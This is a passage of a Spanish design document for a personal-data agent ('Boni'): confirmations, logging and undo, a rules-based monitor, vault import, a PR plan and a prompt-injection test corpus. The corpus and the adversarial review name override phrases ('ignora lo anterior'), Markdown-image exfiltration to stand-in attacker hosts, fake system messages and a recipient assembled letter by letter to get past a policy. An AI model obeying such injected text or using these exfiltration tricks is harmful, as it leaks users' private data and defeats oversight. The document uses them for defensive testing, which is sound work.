- **Una confirmación vale para esos argumentos exactos.** Se ata a un hash de los valores ya resueltos, no a referencias:
  la dirección del contacto, no "el contacto Ana". Si algo cambia entre que Juan confirma y se ejecuta, por ejemplo
  porque otra escritura cambió el correo de Ana, se pide otra vez. Caduca a los pocos minutos y sirve una sola vez.
- **Contra el engaño visual:**
  - se ven la dirección completa y su nombre visible por separado, y los dominios internacionales en punycode;
  - se marcan los caracteres invisibles y los de cambio de dirección del texto (RTL), y los homógrafos de un contacto
    conocido;
  - el texto se ve entero (desplazable, sin cortar), con un aviso si es muy largo;
  - el botón de aceptar no está donde estaba el último botón pulsado, para que no se apruebe por inercia.
- **Contra el cansancio:** como mucho 3 confirmaciones por ejecución; si un plan necesita más, se para y lo dice. En la
  bandeja no hay "aceptar todas" para propuestas de remitentes distintos: se acepta por grupo, viendo cada grupo.
- **Confirmación reforzada** (propuesto para cuando haya pagos o envíos a terceros): una clave del dispositivo firma la
  confirmación (Keystore en Android, WebAuthn en el escritorio). Un token de sesión robado no basta para confirmar desde
  otro sitio.
- **Boni nunca pide secretos por la conversación.** El catálogo de `ask` no tiene campo de contraseña ni de código, y la
  interfaz lo dice ("Boni nunca te pedirá una contraseña aquí"). Un plan que intente pedirla no tiene con qué.
- **Cada decisión se registra** con el id de la regla que la tomó.

### 7.6 Bandeja de propuestas
- Una propuesta es una operación pendiente: herramienta, argumentos con sus etiquetas, fuentes, ejecución que la creó y
  vista pintada por el código. Se agrupan por fuente y por día; por defecto, una notificación al día.
- **Aceptar (un toque)** ejecuta por el mismo camino de políticas, con el origen "aceptado por Juan en un dispositivo
  personal". Eso satisface P4, pero no P2 ni P3: un destinatario sacado de un correo sigue sin valer.
- También se puede rechazar o posponer. Si una propuesta envejece (la entidad cambió después), se marca y se rehace.
- Las ediciones a mano del espejo de Obsidian (sección 9.2) llegan aquí como propuestas.

### 7.7 Registro y deshacer
- **Toda mutación es una operación** en `ops`: actor (Juan, agente, importación, conector), dispositivo, ejecución y
  paso del plan, el antes y el después por campo, y la etiqueta.
- **Deshacer aplica la operación inversa como una operación nueva**, así que la historia nunca se reescribe. Se puede
  deshacer una operación o **toda una ejecución** ("deshacer lo que hizo esta petición"). Lo que sale fuera (un correo
  enviado) no se puede deshacer: por eso P5 pide confirmación.
- **Registro de ejecuciones** (`runs`, `run_steps`): el plan, cada decisión de política, cada llamada a un modelo
  (proveedor, modelo, tokens, prompt y respuesta completos, guardados en la base del usuario y cifrados) y los tiempos.
- **Transparencia por niveles** (lo que Juan sí puede ajustar): ver solo lo que pide su atención, un resumen de cada
  ejecución o el detalle completo.

### 7.8 Monitor
Reglas en código sobre el registro (P11 y alertas de patrones raros), no un modelo. Si algún día se añade un monitor
con modelo: de otro proveedor o local, y vigilando llamadas a herramientas, no respuestas (plan, sección 3).

### 7.9 Primeras herramientas
- **Leer:** `entities.query`, `entities.get`, `entities.aggregate`, `entities.search` (FTS), `schema.describe`.
- **Escribir:** `entities.create`, `entities.update`, `entities.delete` (papelera), `links.set`.
- **Esquema y vistas:** `schema.create_type`, `schema.add_field`…, `views.create`, `views.update`.
- **Otras:**
  - `capture.expense` (un `entities.create` sobre el tipo movimiento, con sus reglas);
  - `ask` (lo resuelve el intérprete);
  - `notify` (solo a los dispositivos de la propia cuenta: el destinatario lo fija el código, no es un argumento).
- **Lo que no hay en el primer PR del agente:** nada con `egress` ni `send`. Llegan con el correo (paso 2 del plan) y
  con el trabajador web (después), y entonces ya está el corpus de inyecciones para probarlas.

### 7.10 Capa de modelos intercambiable

```ts
interface ModelProvider {
  id: string;                          // "anthropic", "fake", "adversary", "local-…"
  privacy: "external-api" | "verifiable" | "local";
  complete(req: { role: "planner" | "reader" | "voice"; system: string; input: unknown;
                  schema: JsonSchema; maxTokens: number }): Promise<{ json: unknown; usage: Usage; model: string }>;
}
```

- **Un modelo por papel**, elegido en la configuración del servidor (Juan no tiene que tocar nada). La seguridad no
  depende de cuál sea.
- **Propuesta para el NAS:**
  - planificador `claude-opus-5-5`, con salida estructurada y esfuerzo `medium`, `high` si las pruebas lo piden;
  - lectores `claude-haiku-4-5` (barato y suficiente para extraer con esquema), o `claude-sonnet-5-5` si la calidad
    no llega.
  - Se mide antes de fijarlo.
- **Gancho para el producto alojado:** el router rechaza mandar datos con cierta etiqueta a un proveedor de cierta
  clase (p. ej. `sensitive` solo a `verifiable`). En el NAS la regla está vacía, por la decisión de Juan de hoy.
- **Proveedores de prueba:** `fake` (respuestas grabadas y deterministas) y `adversary` (devuelve planes y salidas
  maliciosos a propósito). Son los del corpus del CI.
- **UNVERIFIED (revisar en la documentación de Anthropic antes de desplegar):** condiciones de retención de datos,
  retención cero para esta cuenta y región de inferencia en la UE. Existe el parámetro `inference_geo`; si admite UE no
  está comprobado. La clave de API vive en el `.env` del NAS (entrada de Vaultwarden por crear) con un límite mensual
  bajo, como se pensó para hermes-agent.

### 7.10b Conectores y cadena de suministro
- **Descripciones de herramientas de terceros.** Si algún día se conecta un servidor MCP ajeno, su descripción es texto
  externo: puede llevar instrucciones (envenenamiento de herramientas) o cambiar después de aprobarla (*rug pull*). Por
  eso, el planificador nunca ve la descripción que manda el servidor. Cada herramienta ajena se registra a mano con su
  clasificación y una descripción propia. El esquema de sus argumentos se fija por hash y, si cambia, la herramienta se
  desactiva hasta revisarla. Lo que devuelve es `external`.
- **Dependencias:** lockfile congelado, `minimumReleaseAge` de pnpm (ya está en el repo) y scripts de instalación solo
  los aprobados (`allowBuilds`). El núcleo depende de pocos paquetes, y cada dependencia nueva del servidor se justifica
  en su PR. Builds reproducibles en el CI antes del producto alojado (plan, sección 5).
- **Los prompts de sistema** del planificador y de los lectores están en el repo, se revisan en los PRs y su hash queda
  en cada ejecución del registro.
- **La API del modelo:** TLS hacia el host oficial y nada más (la red del contenedor solo sale ahí y a los conectores
  declarados). La clave tiene límite de gasto y vive solo en el `.env` del NAS.

### 7.11 Herramientas diferidas
- El planificador recibe al principio solo un índice corto (nombre y una línea por herramienta). Puede devolver
  `{"need_tools": ["consulta"]}` y el código le pasa los esquemas que coincidan (búsqueda BM25 sobre los metadatos, como
  `tool_search` de Hermes).
- **Diferir es solo para ahorrar contexto.** El plan se valida contra el registro completo y la política es la misma,
  como en Hermes, donde las llamadas puente pasan por el mismo `handle_function_call`.
- **Al revés que en Hermes**, el catálogo de una sesión se acota a lo que ese origen puede usar y **por defecto está
  vacío**. En Hermes, `None` significa "sin restricción".

### 7.12 Programador
- **Los trabajos son declarativos:** un plan plantilla o una mini-app, más el horario, el origen y la etiqueta.
- Los crea Juan desde un turno, con confirmación (P8), y los incorporados de Boni: resumen del día, avisos del
  calendario, prolongar series, refrescar iCal, sincronizar el vault.
- **Se ejecutan como segundo plano (P7):** leen y proponen, nunca actúan fuera de lo reversible.
- **El agente no se programa tareas a sí mismo.** Es una regla dura y sin opción para quitarla. En Hermes es una opción
  de configuración (`cron.allow_agent_scheduling`) que su propio código describe como "loop prevention, not a security
  boundary".

### 7.13 Mini-apps, atajos y memoria
- **Mini-apps y atajos:** son especificaciones declarativas (formulario + consulta + acción del catálogo), nunca código.
  Generalizan los atajos de Boni ("pantalla del servidor + valores"). Al ejecutarse pasan por la política con el origen
  "mini-app" y la etiqueta de su especificación. **No pueden nacer de contenido externo** (P16): un correo puede dar pie
  a una propuesta del tipo "¿quieres un atajo para esto?", pero la especificación la construye un turno de Juan.
- **Memoria del agente:** entidades del tipo de sistema `memory`, con procedencia. El planificador recibe solo memorias
  con integridad `user`, `own` o `imported`. Por P9, nada externo escribe en ella.
- **Una puerta trasera tampoco puede dejarse notas a sí misma.** Una memoria que escribe el planificador con sus propios
  literales (integridad `model`) se guarda, pero Juan la ve en el aviso del turno. No vuelve a entrar en el contexto del
  planificador hasta que Juan la confirma o la reescribe. Así un plan malicioso no deja instrucciones persistentes para
  los siguientes.

### 7.14 Interfaz generada
Los componentes salen del catálogo cerrado (sección 8). Sin HTML, sin enlaces que se abran solos y sin imágenes con URL:
solo adjuntos por hash. Un enlace se abre solo al pulsarlo, y antes se ve el dominio. Vale igual en el WebView de
Android.

**La interfaz es el blanco más valioso.** Un script que corra en la app tiene la sesión de Juan con confianza personal
y podría aceptar confirmaciones. Por eso:
- **Nunca se pinta HTML externo en el origen de la app.** Un correo se muestra como texto. Si alguna vez hace falta su
  HTML, va en un `iframe` aislado (`sandbox` sin `allow-scripts` ni `allow-same-origin`, origen nulo), sin imágenes
  remotas.
- **CSP estricta** en todas las apps, como la del servidor del calendario: solo los scripts propios, sin `inline` ni
  `eval`.
- **Todo texto con etiqueta `model` o `external` se pinta como texto**, nunca como Markdown con enlaces activos. Esto
  incluye el visor del registro, que muestra prompts y respuestas completos.
- **Las confirmaciones viven en una superficie que no pinta datos externos:** la tarjeta de confirmación solo contiene
  componentes del código.

## 8. Motor de vistas declarativas

```ts
interface ViewSpec {
  id: string; name: string; version: 1;
  source: { type: TypeId; filter?: Filter; sort?: Sort[]; limit?: number; period?: Period };
  component:
    | { kind: "table" | "list"; columns: FieldId[] }
    | { kind: "kanban"; groupBy: FieldId }
    | { kind: "calendar"; mapping: CalendarMapping }    // el mapeo actual del calendario
    | { kind: "gallery"; cover?: FieldId }
    | { kind: "chart"; chart: ChartSpec }               // generaliza el ChartSpec de Boni
    | { kind: "number"; measure: Measure; compare?: Compare }
    | { kind: "timeline"; start: FieldId; end?: FieldId }
    | { kind: "form"; fields: FieldId[]; submit: ActionRef }
    | { kind: "map"; location: FieldId };
}
```

- **Gráficas:** el `ChartSpec` de Boni (tipo, medida, eje con granularidad, series, periodo, filtros con sus
  operadores, comparar, los N primeros, orden, detalle) pasa a TypeScript sobre cualquier tipo. La medida deja de ser
  "gasto" fijo: es `aggregate(campo, sum|count|avg|min|max)` más filtros guardados. La definición de "gasto" de Boni se
  queda como una **medida guardada** del tipo movimiento, con la regla de `spending.py`. El motor `engine.py` se porta
  con **pruebas doradas**: se ejecuta el motor Python sobre los mismos datos inventados y el de TypeScript tiene que
  devolver lo mismo.
- **Compilación:** de `ViewSpec` a una consulta SQL con parámetros (sección 5.1, con autorizador de solo lectura), o a
  una evaluación en memoria si el conjunto es pequeño. El servidor calcula y el cliente pinta con componentes React del
  catálogo; un componente que no conoce muestra "actualiza la app", como el contrato de Boni.
- **Páginas y espacios:** una `PageSpec` es una rejilla de vistas más bloques de texto (Markdown restringido). "Hoy" y
  los espacios (áreas de vida) son páginas. Las genera el agente y se editan a mano o hablando.
- **Formularios:** salen de los campos del tipo (superconjunto de elicitation de MCP, como el contrato de Boni). Son la
  base de la captura y de los atajos.
- **El uso repetido no llama al modelo.** Abrir una vista o enviar un formulario es código determinista.
- Los `.base` de Obsidian se podrán traducir a vistas más adelante (abierto).

## 9. Importación, espejo y exportación

### 9.1 Importación del vault (primera migración)
- **Cómo se lee:** con `vault-fs.cjs` y sus reglas (nunca `private/` ni `restricted/`, ni carpetas con punto). En el
  NAS el contenedor ya tiene esas dos carpetas tapadas con montajes vacíos.
- **De qué se crean los tipos:**
  - las definiciones de `_system/colecciones/*.md` (agenda: docencia, gestiones, planes, salud);
  - los esquemas de `_system/conventions.md` y `registros/finanzas/README.md`: movimiento, deuda, persona,
    pertenencia, proyecto, área y diario;
  - un tipo genérico `nota` para wiki, temas y bandeja.
- **Cuánto hay** (contado hoy, sin `private/` ni `restricted/`): agenda 2.755 notas, movimientos 553, personas 102,
  proyectos 83, wiki 96, diario 33, áreas 10 y NotionImport 499.
- **Relaciones:** los `[[enlaces]]` en propiedades se resuelven por nombre de nota y pasan a relaciones; los del cuerpo,
  a menciones. Un enlace que no se puede resolver se guarda como texto y aparece en el informe.
- **Nada se pierde:** las claves de propiedades que no están en el esquema se crean como campos ocultos. Así la
  exportación devuelve las notas tal como eran.
- **Procedencia: lo que cuenta es quién escribió el texto, no la carpeta.** "Externo" es todo texto escrito por alguien
  que no es Juan ni el código de Boni, llegue por donde llegue: un correo, una web, o también una página web guardada
  en una nota, un documento de otra persona o una nota que escribió otro agente después de leer una web. El agente lo
  encuentra en el vault, pero quien lo escribió puede haber metido una inyección.
  - Por defecto, integridad `imported`, con fuente `vault:path@sha256`. **`NotionImport/` también: son notas de Juan**
    aún sin integrar (decidido, Juan, 2026-10-19: "todo es mío"; el `AGENTS.md` del vault ya no lo llama "untrusted").
  - `external`: las notas que sean recortes o copias de textos de otros. Hoy Juan no tiene ninguna; si aparecen, se
    marcan por nota o por carpeta, y las que lleven una propiedad de origen (`source`, `url`) salen en el informe de
    importación para que Juan decida.
  - `model`: lo último que escribió otro agente según el historial de git del vault en el NAS (commits `mcp:` con
    `[hermes]`, por ejemplo). El planificador lo ve, pero nunca vale como destino ni como autoridad. Es un repo aparte,
    así que va en un PR posterior.
  - Sensibilidad: finanzas, salud, diario y el registro de sueño `sensitive`; personas `personal` y `thirdParty`.
- **Los secretos de acceso no se importan.** El changelog del vault cuenta que en `NotionImport/` hubo claves de API y
  contraseñas de aplicación (borradas el 2026-10-09). Antes de importar, el código busca patrones de secretos (claves de
  API, tokens, contraseñas de aplicación, claves privadas). Lo que encuentra no entra: queda "fuera de alcance", la nota
  se importa sin esa línea y el informe dice dónde estaba, para que Juan lo borre del vault.
- **Los números de identidad sí se importan, como dato sensible** (decidido, Juan, 2026-10-19: los DNI que quedan en
  `NotionImport/` se quedan como están). El mismo análisis los detecta (DNI/NIE, IBAN, tarjetas) y marca esos campos o
  notas como `sensitive`, así que P3 impide que salgan hacia internet sin confirmación.
- **Repetible:** la tabla `vault_map (path, entity, sha256, mtime)` hace que importar dos veces no duplique nada.
- **Una colección tiene un modo:**
  - **`vault`:** la verdad sigue en el vault; el núcleo la indexa y escribe en él con las reglas de hoy, como el
    servidor del calendario actual.
  - **`core`:** la verdad pasa al núcleo y el vault recibe el espejo.
  - El cambio de `vault` a `core` es una operación con informe previo: cuántas notas, cuáles no se pueden colocar y la
    diferencia con lo que hay. Lo lanza Juan, colección a colección, y la agenda va la última.

### 9.2 Espejo Markdown (solo lectura) y Obsidian
- Para cada colección en modo `core`, el núcleo escribe en el vault una nota por entidad, **en el mismo formato de
  hoy**: claves de Full Calendar, nombres `YYYY-MM-DD Título.md`, `Area: [[…]]`. Así las Bases de Obsidian siguen
  funcionando. Para escribir reutiliza las reglas de `vault/provider.ts` (solo cambian las líneas editadas).
- **El espejo también es una salida.** Obsidian carga las imágenes remotas de una nota al abrirla, así que una
  `![](https://atacante/?d=…)` escrita en el espejo sacaría datos sin que nadie pulse nada. Además, otros agentes (Claude
  y Hermes por vault-mcp) leen el vault. Por eso:
  - el texto con integridad `model` o `external` se escribe con los recursos remotos neutralizados (P17);
  - las notas del espejo llevan en el frontmatter la integridad de su contenido (`boni_integrity: external`), para que
    los demás agentes la vean.
- **Edición a mano del espejo:** si el sha256 de un archivo no es el último que escribió el núcleo, el cambio no se
  pisa en silencio. Se convierte en una **propuesta** ("Has editado *X* en Obsidian: ¿aplicar?") con el detalle de qué
  cambió. Lo que llega por Syncthing puede venir de Juan o de otro agente que escribe en el vault, así que entra como
  `imported`.
- **El plugin de Obsidian pasa a ser cliente del núcleo** para esas colecciones (modo servidor, como las apps). Editar
  en el calendario dentro de Obsidian sigue funcionando y escribe en el núcleo, que actualiza el espejo.

### 9.3 Exportación en un clic
Un `.zip` con:
- `README.md`;
- `schema.json`, con JSON Schema por tipo y los metadatos de Boni;
- `<tipo>/*.md`, Markdown con frontmatter YAML, compatible con Obsidian;
- `csv/<tipo>.csv` y `json/<tipo>.ndjson`;
- `files/` (adjuntos), `views.json` y, opcionalmente, `log.ndjson` (el registro).

En el NAS lo genera el servidor. En el producto alojado lo genera el dispositivo a partir de su copia descifrada. La
importación desde Notion y CSV, más adelante.

## 10. El calendario como módulo
- **`packages/calendar` no cambia de fondo.** `CollectionProvider` ya separa las filas de dónde viven. Se añade un
  `coreProvider` que traduce entidades a `Row` (con `Row.id` = id de la entidad y los valores por `key` del campo), y la
  web del calendario funciona igual contra el núcleo.
- **Mientras una colección esté en modo `vault`**, el módulo usa el proveedor del vault de hoy: el mismo código del
  servidor actual (`vaults.ts`, el escritor, la prolongación de series).
- **Rutas sin cambios:** `/api/login`, `/api/snapshot`, `/api/changes`, `/api/stream`, `/api/apply`, `/api/account*`,
  `/api/external`, `/api/reminders`, `/api/push`, `/api/collections/reminders`. Avisos, UnifiedPush, calendarios
  externos y la prolongación de series se mueven tal cual. Las apps del calendario ya instaladas siguen funcionando sin
  actualizarse.
- Como el id de fila deja de ser la ruta de la nota, se cumple la idea pendiente de `docs/estado.md` ("un índice con id
  propio por evento").

## 11. Transición desde los dos servidores, sin romper nada

| Paso | Qué | Qué ve Juan |
|---|---|---|
| T0 | Hoy: servidor del calendario (Node, Funnel) y servidor de Boni (Python, tailnet) | — |
| T1 | Renombrar los repos y reorganizar el monorepo. Nada desplegado cambia | Obtainium: volver a añadir las dos apps con su filtro (la misma firma, así que se actualizan encima) |
| T2 | El Boni server sustituye al servidor del calendario en el mismo nodo `calendar` y con la misma URL: `system.db` con las cuentas migradas, las mismas rutas y el modo `vault` | Nada: sigue con sus sesiones |
| T3 | El Boni server habla también `/api/v1/*` de Boni (gráficas, atajos, widgets, apuntar gasto, que escribe la nota de movimiento directamente en el vault con las reglas de `vault-fs`). Las apps de Boni cambian de servidor en sus ajustes | Cambiar la dirección en Ajustes → Cuenta de Boni (escritorio y Android) |
| T4 | Listener tailnet completo en su propio nodo (topología abajo) y agente encendido solo por tailnet | La conversación en Boni |
| T5 | Colecciones a modo `core` una a una: primero un tipo nuevo (libros, la prueba del agente), después movimientos, la agenda la última | Un informe por colección antes del cambio |
| T6 | Retirar el servidor Python y el token `boni` de vault-mcp | — |

Cada paso conserva la imagen y una copia de las bases del paso anterior para volver atrás.

**Topología de exposición (decidida en principio; detalles UNVERIFIED hasta el PR de despliegue).** Dos entradas,
distinguidas por **dónde llegan** y nunca por cabeceras que se puedan falsificar:
- El proceso escucha en dos puertos: `127.0.0.1:8787`, con todo, detrás del sidecar del nodo tailnet; y `:8788`, con la
  lista blanca, solo en una red Docker interna.
- El nodo público (`calendar`, con Funnel) hace de proxy hacia `:8788` por esa red interna, con el mismo patrón que
  `vault-internal`.
- **La lista blanca está en el código** y falla en cerrado: una ruta nueva no está en el listener público hasta que se
  añade a propósito, y una prueba lo comprueba.
- En T2, antes de que exista el segundo nodo, todo llega por el nodo público y solo hay rutas de la lista blanca (las de
  hoy).

## 12. Plan de PRs (en orden; cada uno con sus pruebas y el CI en verde)

| # | PR | Pruebas |
|---|---|---|
| 0 | **Este diseño** (`docs/nucleo.md`) | — |
| 1 | Renombrado y monorepo (T1): `@boni/*`, carpetas `apps/calendar-*`, prefijos de etiqueta, workflows por app; `legacy/boni/` con historial (`git subtree`). Ningún cambio de comportamiento | Todo el CI actual pasa igual; un APK y un `.deb` de prueba con los nombres nuevos |
|  | **Hecho (2026-10-19):** repos renombrados en GitHub; 1a, `legacy/boni/` con historial limpio (PR 53); 1b, carpetas y paquetes `@boni/*`, etiqueta `calendar-android-v…` (PR 54). Se quedan como estaban los nombres de los que dependen los dispositivos (`AGENTS.md`). Los workflows por app llegan con la primera app nueva | |
| 2 | `packages/net`: `netSafety` (sección 13) y `feeds.ts` encima de él | Rebinding de DNS, redirecciones, CGNAT, IPv4 dentro de IPv6, metadatos, parámetros con credenciales, tamaño y tiempo |
|  | **Hecho (2026-10-19, PR 57):** `@boni/net` (`fetchText`, `isBlockedAddress`, `credentialParam`) y `feeds.ts` encima | |
| 3 | `packages/entities`: tipos, valores, validación, etiquetas y su combinación, operaciones de esquema (puro) | Unitarias y por propiedades (`fast-check`): la combinación de etiquetas nunca sube la integridad ni baja la sensibilidad |
|  | **Hecho (2026-10-19, PR 58):** `@boni/entities` con etiquetas, valores derivados, valores por tipo de campo y operaciones de esquema con inversa; propiedades con un generador con semilla (sin `fast-check`) | |
| 4 | `packages/store`: SQLite por usuario, migraciones, CRUD, enlaces, FTS, `field_prov`, `ops`, deshacer, `KeyProvider` del NAS, copias cifradas | Deshacer(hacer(x)) = x por propiedades; autorizador de solo lectura; migraciones desde vacío y desde la versión anterior |
| 5 | Identidad: `system.db`, dispositivos con confianza, revocar uno; `boni admin import-accounts --dry-run` | Contra bases inventadas con los dos formatos; sesiones migradas que siguen valiendo |
| 6 | `apps/server` = servidor del calendario reorganizado en módulos, con dos listeners y lista blanca (T2) | Todas las pruebas del servidor actual sin tocar; una ruta fuera de la lista da 404 en el público; prueba de arranque como el contenedor (`write.test.ts`) |
| 7 | Importación del vault (modo `vault`, índice), informe `--dry-run`, procedencia por carpeta | Vault inventado con notas de cada tipo, enlaces y claves extrañas; repetir no duplica; exportar e importar devuelve lo mismo |
| 8 | `packages/views`: ViewSpec, compilador y motor de gráficas portado | Pruebas doradas contra el motor Python sobre datos inventados |
| 9 | Compatibilidad `/api/v1` de Boni (T3) | Los `api/examples` del contrato de Boni contra el servidor nuevo |
| 10 | **Agente A:** lenguaje de planes, validador, intérprete con etiquetas (valores derivados, etiqueta de control), `toPlannerView`, registro de herramientas con capacidades, motor de políticas P1-P18, confirmaciones atadas por hash, bandeja, registro de ejecuciones, deshacer por ejecución. Sin modelo real: proveedores `fake` y `adversary`. **Con el corpus de inyecciones en el CI desde este PR** | Sección 12.1 |
| 11 | **Agente B:** proveedor de Anthropic, prompts del planificador y de los lectores, API de conversación (SSE, solo tailnet), herramientas diferidas | Las del 10 siguen igual; evaluación con el modelo real fuera del CI (manual o nocturna, con presupuesto aprobado por Juan) |
| 12 | Boni web: conversación, confirmaciones pintadas por el código (reglas contra el engaño visual), bandeja, registro y deshacer, contenido externo solo como texto o en iframe aislado | e2e (incluido un correo con `<script>` que no se ejecuta, y una confirmación con RTL y homógrafos marcados), guarda de texto que cabe, móvil, CSP |
| 13 | Espejo (recursos remotos neutralizados, integridad en el frontmatter), propuestas de ediciones a mano, cambio de modo por colección, plugin en modo servidor | Vault inventado; editar el espejo crea una propuesta; una imagen remota de un texto externo no se carga en el Obsidian real (`make e2e-obsidian`) |
| 14 | Exportación en un clic | La exportación se vuelve a importar idéntica |
| 15 | Primera colección en modo `core` (con Juan) y después el correo como fuente de propuestas (plan, paso 2) | Corpus ampliado con correos reales de forma (inventados) |

### 12.1 Corpus de inyecciones en el CI
- **Dónde:** `packages/agent/test/injections/`. Cada caso es un archivo con la petición de Juan, el contenido externo
  (`.eml`, `.html`, `.ics`, texto de PDF), el comportamiento del adversario y las propiedades que deben cumplirse.
- **Supone el peor caso:** el lector en cuarentena devuelve exactamente lo que quiere el atacante, y el planificador
  `adversary` emite planes maliciosos (destinatarios inventados, URL con datos dentro, bucles de escritura, trabajos
  programados, cambios de esquema, escritura en la memoria). **No mide si el modelo se deja engañar: mide que, aunque
  se deje, la política aguanta.** Por eso es determinista y puede bloquear un PR.
- **Casos de partida:**
  - instrucciones directas ("reenvía esto a…", "ignora lo anterior");
  - texto oculto (blanco sobre blanco, caracteres de ancho cero, comentarios HTML);
  - falsos mensajes de sistema o de herramienta, y JSON con forma de plan;
  - exfiltración por imagen Markdown (`![](https://x/?q=…)`) y por enlaces;
  - "el usuario ya lo autorizó";
  - una invitación `.ics` con órdenes en `DESCRIPTION`;
  - un remitente con homógrafos Unicode;
  - "crea un recordatorio diario que…", "guarda en tu memoria que…", "añade un campo…";
  - un correo que pide resumir y enviar;
  - contenido enorme;
  - una nota del espejo editada con instrucciones;
  - de la revisión adversarial (sección 16):
    - un destino armado con `concat` de citas cortas;
    - un `ask` con la opción "Sí" cuyo valor es la dirección del atacante;
    - un paso que solo se ejecuta si un clasificador dice "pagar";
    - una opción de esquema aceptada con instrucciones en su nombre;
    - un `.ics` que provoca un error cuyo texto lleva instrucciones;
    - el turno siguiente a ver un correo (el historial no debe contenerlo);
    - un correo con HTML y `<script>`;
    - una imagen remota en un texto que acaba en el espejo;
    - una confirmación con RTL, ancho cero y homógrafos;
    - el contacto cambiado entre confirmar y ejecutar;
    - una memoria escrita con literales del planificador;
    - una descripción de herramienta MCP que cambia;
    - 500 correos de un remitente (coste).
- **Propiedades que se comprueban siempre:**
  - ningún `send`, `egress` ni `write_irreversible` sin una confirmación;
  - ningún destino con integridad `external`, `model` o `ambient`;
  - lo que se deriva de externo queda como propuesta;
  - la memoria y los trabajos no cambian;
  - la vista de confirmación contiene los argumentos reales;
  - las etiquetas del resultado no son más altas que las de la entrada;
  - nada `external` cruza `toPlannerView` (se comprueba buscando en todo lo que se manda al proveedor `fake` un marcador
    único plantado en cada contenido externo: si aparece, falla);
  - ningún destino derivado ni bajo una condición externa se ejecuta sin propuesta;
  - lo que se escribe en el espejo no contiene recursos remotos activos si su integridad es `model` o `external`;
  - una confirmación aceptada no sirve para otros argumentos ni dos veces;
  - los límites diarios cortan el gasto.
- **Además, pruebas por propiedades** sobre planes aleatorios: con cualquier plan válido y cualquier contenido, los
  invariantes de arriba se cumplen.
- **El CI falla** si una propiedad se rompe, y lo ejecuta todo PR que toque `packages/agent`, `packages/entities`,
  `packages/store` o `apps/server`.

## 13. Hermes: qué aprovechamos y qué no
Leído en `NousResearch/hermes-agent` (rama `main`, commit `b4170e73`, 2026-10-19).

| Pieza de Hermes | Qué hace | En Boni |
|---|---|---|
| Herramientas por punto de entrada (`toolsets.py`: `hermes-webhook` solo con `web_search`, `web_extract`, `vision_analyze` y `clarify`; las de interfaz las añade el cliente por sesión, `CLIENT_SURFACE_TOOLSETS`; ninguna herramienta `send_message` que pueda llamar el agente) | Recorta herramientas según de dónde llega la sesión | **Aprovechar la idea**, pero por etiquetas de cada dato y no por perfil. **No copiar:** su lista "segura" para contenido externo incluye `web_search`, que es un canal de salida (la tríada letal). En Boni, el origen externo nunca da `egress` |
| `tools/url_safety.py` | Bloquea direcciones privadas, CGNAT (la tailnet), enlace local y metadatos de nube, también en forma IPv4 dentro de IPv6; **vuelve a aplicar la política al conectar** y marca la IP validada (cierra el rebinding de DNS); revalida cada redirección; rechaza parámetros que llevan credenciales (`token=`, `signature=`…) | **Aprovechar casi entero** como `packages/net` (PR 2). `feeds.ts` del calendario comprueba la IP y luego `fetch` vuelve a resolver el nombre: tiene el hueco de rebinding que Hermes cierra |
| `cron/scheduler.py` (`_resolve_cron_disabled_toolsets`, `_resolve_cron_enabled_toolsets`) | Quita `cronjob`, `messaging` y `clarify` al agente que corre por cron; si no puede resolver la lista de herramientas, **falla en cerrado** (aprendido de fallos: una lista vacía o `None` ampliaba a todas) | **Aprovechar:** fallar en cerrado y tratar una lista vacía como vacía. **No copiar:** que quitar la programación sea una opción (`allow_agent_scheduling`) "no de seguridad". En Boni es la regla P8, sin opción |
| `cronjob_prompt_scan.py` | Expresiones regulares contra inyecciones ("ignore previous instructions", `cat .env`…) | **No copiar como defensa:** es una lista negra. Como mucho, una señal más para el monitor |
| `tool_search` (puente `tool_search`, `tool_describe`, `tool_call`; catálogo sin estado, rehecho en cada montaje; las llamadas pasan por el mismo `handle_function_call`) | Herramientas diferidas para ahorrar contexto | **Aprovechar:** catálogo sin estado, BM25 y mismo camino de ejecución. **No copiar:** el catálogo sin acotar por defecto (`None` = sin restricción) |
| `approval_floors.py` | Bloqueos que se aplican antes que cualquier modo "yolo" | La idea de un **suelo que ningún modo salta** es la tabla P1-P12 |
| Perfiles en un mismo proceso, hooks por nombre de herramienta | Aislamiento elegido por el usuario y listas negras | **No copiar** (plan, sección 7) |

## 14. Riesgos y abiertos
- **Abierto:** cifrado de páginas de SQLite (5.2) y si el `KeyProvider` del producto alojado desenvuelve la clave en el
  dispositivo o en un KMS con atestación.
- **Abierto:** tipos con muchísimas entidades (tabla física por tipo), solo si aparece el caso.
- **Decidido (Juan, 2026-10-19):** `NotionImport/` son notas suyas (`imported`); hoy no hay carpetas de recortes.
- **Abierto:** modelos definitivos por papel. Se mide con una evaluación pequeña antes de fijarlos (gasto aprobado por
  Juan).
- **UNVERIFIED:** retención, retención cero y región UE de la API de Anthropic para esta cuenta; detalles de Tailscale
  para el proxy del nodo público hacia otra red Docker.
- **Riesgo:** el planificador ve los datos propios (decisión de Juan). Una inyección guardada antes en una nota propia,
  por ejemplo un texto pegado de un correo, podría influir en sus planes. Mitigación: lo pegado a mano sigue siendo
  `user`, pero nunca es una orden (la única autoridad es el turno), y P2, P3 y P5 aguantan aunque el plan sea malicioso.
- **Riesgo:** `node:sqlite` es síncrono, así que una consulta grande bloquea el proceso. Mitigación: límites en las
  consultas compiladas, índices y, si hace falta, un worker por usuario.

## 15. Hallazgos de paso (fuera de este diseño)
- **`boni-calendar` es público ahora mismo** (comprobado con `gh repo view`, 2026-10-19), mientras que Juan entendía
  que todos los repos eran privados. Cambiar la visibilidad lo decide y lo hace Juan; con el repo privado, Obtainium
  necesita un token también para Boni Calendar.
- **`apps/server/src/feeds.ts`**: hueco de rebinding de DNS (13). Se arregla en el PR 2.
- **Las gráficas, atajos y widgets de Boni** están en tablas globales de `boni.sqlite3`, no por usuario. Con una sola
  cuenta no importa; la migración (6) los asigna a la cuenta.

## 16. Revisión adversarial (2026-10-19)
Revisión pedida por Juan: volver a leer el diseño como lo leería alguien que quiere manipular el agente (21 ataques). Para cada
ataque: qué permitía la primera versión (PR 52, primer commit) y qué cambia. Los que tienen "Alta" rompían una regla base
sin que el modelo tuviera que hacer nada raro, o daban control total.

| # | Ataque | Qué permitía la primera versión | Cambio | Gravedad |
|---|---|---|---|---|
| A1 | **Destino armado a trozos:** el planificador cita letras sueltas de la petición de Juan y las une con `concat` hasta formar `atacante@x.com` | La cita da integridad `user` y `concat` la conservaba: P2 no lo paraba | Valores `derived`; un destino solo acepta valores sin derivar; citas de tramos completos (4.2, 7.2, P14) | Alta |
